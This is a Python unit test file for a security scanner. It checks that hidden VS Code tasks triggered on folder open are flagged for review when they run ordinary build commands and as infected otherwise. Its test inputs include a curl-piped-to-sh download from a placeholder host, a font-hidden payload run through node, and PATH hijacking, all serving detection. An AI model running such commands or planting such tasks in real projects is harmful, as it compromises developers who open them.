#!/usr/bin/env python3
"""An editor task that hides itself and runs only an ordinary build or package command when the folder opens
is for you to check; one that runs anything else, or can point a tool's name elsewhere, still reads
infected, and a payload in the package script it runs is still found."""
from __future__ import annotations

import json
import unittest
from unittest import mock

from stayawake.bots.security.matchers.structural import StructuralJsonMatcher
from stayawake.bots.security.models import INFECTED, Severity
from stayawake.bots.security.signatures import load_signatures
from tests.bots.security.test_a_font_tool_is_not_a_disguised_payload import _PLACES, _STILL_RUN
from tests.bots.security.test_a_package_script_an_editor_task_runs_is_read import _PAYLOADS, _scan
from tests.support.samples import FONT_PAYLOAD, INFECTED_PROJECT, joined

_CHECK = "vscode-task-hidden-ordinary"
_INFECTED = "vscode-task-folderopen-exec"
_HIDINGS = ({"hide": True}, {"presentation": {"reveal": "never"}}, {"presentation": {"echo": False}},
            {"presentation": {"reveal": "silent"}})
_DOWNLOAD = joined("curl -s https://example.invalid/i | ", "sh")


def _hidden(**fields) -> dict:
    return {"label": "dev", "type": "shell", "runOptions": {"runOn": "folderOpen"},
            "presentation": {"reveal": "never", "echo": False}, **fields}


def _grade(*tasks, **file_fields) -> dict:
    text = json.dumps({"version": "2.0.0", **file_fields, "tasks": list(tasks)})
    sigs = [s for group in load_signatures().values() for s in group]
    target = mock.Mock(iter_files=lambda: [".vscode/tasks.json"], read_text=lambda _r: text)
    return {f.signature_id: f for f in StructuralJsonMatcher().scan(target, sigs, sigs)}


class TestAnOrdinaryHiddenTaskIsForYouToCheck(unittest.TestCase):
    def test_a_hidden_task_that_runs_an_ordinary_command_is_for_you_to_check(self):
        for command in ("npm run watch", "pnpm install", "yarn dev", "tsc --watch -p .",
                        "git pull origin main --rebase", "code --install-extension ms-python.python",
                        "cargo watch -x check", "make", "dotnet watch", "npm.cmd run build",
                        "npm run watch -- --port ${input:port}"):
            for hiding in _HIDINGS:
                with self.subTest(command=command, hiding=hiding):
                    task = {"label": "dev", "type": "shell", "command": command,
                            "runOptions": {"runOn": "folderOpen"}, **hiding}
                    found = _grade(task)
                    self.assertIn(_CHECK, found)
                    self.assertNotIn(_INFECTED, found)
                    self.assertEqual(found[_CHECK].severity, Severity.HIGH)

    def test_a_hidden_task_that_installs_a_marketplace_extension_is_for_you_to_check(self):
        for extension in ("esbenp.prettier-vscode", "ms-python.python@2024.1.0"):
            with self.subTest(extension=extension):
                self.assertIn(_CHECK, _grade(_hidden(command=f"code --install-extension {extension}")))

    def test_an_editor_task_with_no_command_of_its_own_is_for_you_to_check(self):
        for fields in ({"type": "npm", "script": "watch"},
                       {"type": "typescript", "tsconfig": "tsconfig.json"},
                       {"type": "gulp", "task": "watch"}):
            with self.subTest(fields=fields):
                task = {**_hidden(), **fields}
                task.pop("command", None)
                self.assertIn(_CHECK, _grade(task))

    def test_a_compound_of_ordinary_tasks_is_for_you_to_check(self):
        for depends, others in ((["npm: watch"], ()),
                                (["build"], ({"label": "build", "type": "shell", "command": "tsc -w"},)),
                                ([{"type": "npm", "script": "build"}], ())):
            with self.subTest(depends=depends):
                compound = {"label": "all", "dependsOn": depends, "runOptions": {"runOn": "folderOpen"},
                            "presentation": {"reveal": "never"}}
                self.assertIn(_CHECK, _grade(compound, *others))


class TestEveryOtherHiddenTaskStillReadsInfected(unittest.TestCase):
    def test_a_hidden_task_that_runs_anything_else_still_reads_infected(self):
        for command in (f"node {FONT_PAYLOAD}", _DOWNLOAD, "bash ./scripts/setup.sh",
                        "powershell -File scripts/setup.ps1", f"npm run watch && {_DOWNLOAD}",
                        "npx some-tool", "npm exec some-tool", "${env:COMSPEC}", "echo ready",
                        "python -m http.server", "npm run watch; node server.js", "bun run dev",
                        "./node_modules/.bin/tsc -w", "git clone https://example.invalid/r.git"):
            with self.subTest(command=command):
                found = _grade(_hidden(command=command))
                self.assertIn(_INFECTED, found)
                self.assertNotIn(_CHECK, found)

    def test_a_hidden_task_that_installs_an_extension_file_still_reads_infected(self):
        for extension in ("./tools/helper.vsix", "helper.vsix", "../x/y.vsix", "https://example.invalid/x.vsix",
                          ".\\tools\\helper.vsix", "HELPER.VSIX", "${workspaceFolder}/helper.vsix",
                          "./tools/helper"):
            with self.subTest(extension=extension):
                found = _grade(_hidden(command=f"code --install-extension {extension}"))
                self.assertIn(_INFECTED, found)
                self.assertNotIn(_CHECK, found)

    def test_a_hidden_task_that_can_point_a_tools_name_elsewhere_still_reads_infected(self):
        for fields, file_fields in (({"options": {"env": {"PATH": "./bin"}}}, {}),
                                    ({"options": {"shell": {"executable": "./run.sh"}}}, {}),
                                    ({"windows": {"options": {"env": {"Path": ".\\bin"}}}}, {}),
                                    ({}, {"options": {"env": {"PATH": "./bin"}}})):
            with self.subTest(fields=fields, file_fields=file_fields):
                self.assertIn(_INFECTED, _grade(_hidden(command="npm run watch", **fields), **file_fields))

    def test_a_compound_with_anything_else_still_reads_infected(self):
        for depends, others in ((["missing"], ()),
                                (["run"], ({"label": "run", "type": "shell",
                                            "command": f"node {FONT_PAYLOAD}"},)),
                                ([{"type": "shell", "command": _DOWNLOAD}], ()),
                                ([], ())):
            with self.subTest(depends=depends):
                compound = {"label": "all", "dependsOn": depends, "runOptions": {"runOn": "folderOpen"},
                            "presentation": {"reveal": "never"}}
                self.assertIn(_INFECTED, _grade(compound, *others))

    def test_an_ordinary_task_that_depends_on_anything_else_still_reads_infected(self):
        runner = {"label": "fetch", "type": "shell", "command": _DOWNLOAD}
        for own in ({"type": "npm", "script": "watch"}, {"type": "shell", "command": "npm run watch"}):
            with self.subTest(own=own):
                task = {**_hidden(), **own, "dependsOn": ["fetch"]}
                if "command" not in own:
                    task.pop("command", None)
                self.assertIn(_INFECTED, _grade(task, runner))

    def test_a_command_the_editor_cannot_read_still_reads_infected(self):
        self.assertIn(_INFECTED, _grade(_hidden(command=["npm", 1])))
        unreadable = _hidden(type="npm", script="watch", command=["node", FONT_PAYLOAD, 1])
        self.assertIn(_INFECTED, _grade(unreadable))

    def test_an_editor_task_naming_nothing_to_run_still_reads_infected(self):
        task = _hidden(type="npm")
        task.pop("command", None)
        self.assertIn(_INFECTED, _grade(task))

    def test_every_way_of_running_a_font_hidden_still_reads_infected(self):
        for name, template in _STILL_RUN.items():
            with self.subTest(name=name):
                self.assertIn(_INFECTED, _grade(_hidden(command=template.format(**_PLACES))))

    def test_the_published_campaign_and_the_known_implant_still_read_infected(self):
        campaign = {"reveal": "never", "echo": False, "focus": False, "close": True, "panel": "dedicated",
                    "showReuseMessage": False}
        self.assertIn(_INFECTED, _grade(_hidden(command=_DOWNLOAD, presentation=campaign, problemMatcher=[])))
        implant = json.loads(INFECTED_PROJECT[".vscode/tasks.json"]())
        self.assertIn(_INFECTED, _grade(*implant["tasks"]))

    def test_a_payload_in_the_script_an_ordinary_hidden_task_runs_still_reads_infected(self):
        shapes = [({"command": command}, script) for command, script in (
            ("npm run watch", "watch"), ("npm run-script watch", "watch"), ("npm start", "prestart"),
            ("npm test", "posttest"), ("pnpm dev", "dev"), ("yarn watch", "watch"),
            ("yarn run build", "build"),
            ("npm install", "postinstall"), ("npm install --silent --no-progress", "prepare"),
            ("npm ci", "preinstall"), ("pnpm install", "prepare"), ("yarn install", "postinstall"))]
        shapes += [({"type": "npm", "script": "watch"}, "watch"),
                   ({"type": "npm", "script": "install"}, "prepare"),
                    ({"dependsOn": ["npm: install"]}, "postinstall")]
        for kind, payload in _PAYLOADS.items():
            for fields, script in shapes:
                with self.subTest(kind=kind, fields=fields):
                    task = {**_hidden(), **fields}
                    if "command" not in fields:
                        task.pop("command", None)
                    result = _scan([task], {script: payload()})
                    ids = {f.signature_id for f in result.findings}
                    self.assertIn(_CHECK, ids)
                    self.assertEqual(result.verdict, INFECTED)


if __name__ == "__main__":
    unittest.main()
